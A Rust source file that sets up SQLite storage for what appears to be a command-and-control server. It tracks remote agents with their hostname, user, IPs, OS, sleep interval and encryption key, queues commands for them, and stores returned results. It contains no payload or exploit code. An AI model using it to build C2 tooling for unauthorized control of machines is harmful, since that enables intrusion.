use anyhow::Result;
use sqlx::{sqlite::SqlitePool, Pool, Sqlite, ConnectOptions};
use tracing::info;
use std::path::Path;
use serde::{Deserialize, Serialize};

#[derive(Debug, Serialize, Deserialize, sqlx::FromRow)]
pub struct Task {
    pub id: String,
    pub agent_id: Option<String>,
    pub command: Option<String>,
    pub arguments: Option<String>,
    pub status: Option<String>,
}

pub struct Storage {
    pool: Pool<Sqlite>,
}

impl Storage {
    pub async fn new(db_path: &str) -> Result<Self> {
        let database_url = format!("sqlite:{}", db_path);
        
        // Create the database file if it doesn't exist
        if !Path::new(db_path).exists() {
            info!("Creating new database at {}", db_path);
            let options = sqlx::sqlite::SqliteConnectOptions::new()
                .filename(db_path)
                .create_if_missing(true);
            options.connect().await?;
        }

        let pool = SqlitePool::connect(&database_url).await?;
        let storage = Self { pool };
        
        storage.initialize_schema().await?;
        storage.migrate().await?;
        
        Ok(storage)
    }

    async fn migrate(&self) -> Result<()> {
        // A simple way to add column if not exists in SQLite
        let _ = sqlx::query("ALTER TABLE agents ADD COLUMN external_ip TEXT").execute(&self.pool).await;
        Ok(())
    }

    async fn initialize_schema(&self) -> Result<()> {
        info!("Initializing database schema...");
        
        sqlx::query(
            "CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                hostname TEXT,
                username TEXT,
                ip_address TEXT,
                external_ip TEXT,
                os_info TEXT,
                sleep INT DEFAULT 5,
                encryption_key BLOB,
                first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_seen DATETIME DEFAULT CURRENT_TIMESTAMP
            );"
        ).execute(&self.pool).await?;

        sqlx::query(
            "CREATE TABLE IF NOT EXISTS tasks (
                id TEXT PRIMARY KEY,
                agent_id TEXT,
                command TEXT,
                arguments TEXT,
                status TEXT DEFAULT 'PENDING',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                sent_at DATETIME,
                completed_at DATETIME,
                FOREIGN KEY(agent_id) REFERENCES agents(id)
            );"
        ).execute(&self.pool).await?;

        sqlx::query(
            "CREATE TABLE IF NOT EXISTS results (
                task_id TEXT PRIMARY KEY,
                output BLOB,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(task_id) REFERENCES tasks(id)
            );"
        ).execute(&self.pool).await?;

        Ok(())
    }

    pub async fn create_task(&self, agent_id: &str, command: &str, arguments: &str) -> Result<String> {
        let task_id = uuid::Uuid::new_v4().to_string();
        
        sqlx::query(
            "INSERT INTO tasks (id, agent_id, command, arguments, status) VALUES (?, ?, ?, ?, 'PENDING')"
        )
        .bind(&task_id)
        .bind(agent_id)
        .bind(command)
        .bind(arguments)
        .execute(&self.pool)
        .await?;

        Ok(task_id)
    }

    pub async fn get_pending_tasks(&self, agent_id: &str) -> Result<Vec<Task>> {
        let tasks = sqlx::query_as::<_, Task>(
            "SELECT id, agent_id, command, arguments, status FROM tasks WHERE agent_id = ? AND status = 'PENDING'"
        )
        .bind(agent_id)
        .fetch_all(&self.pool)
        .await?;

        // Mark tasks as SENT
        sqlx::query(
            "UPDATE tasks SET status = 'SENT', sent_at = CURRENT_TIMESTAMP WHERE agent_id = ? AND status = 'PENDING'"
        )
        .bind(agent_id)
        .execute(&self.pool)
        .await?;

        Ok(tasks)
    }

    pub fn pool(&self) -> &Pool<Sqlite> {
        &self.pool
    }
}
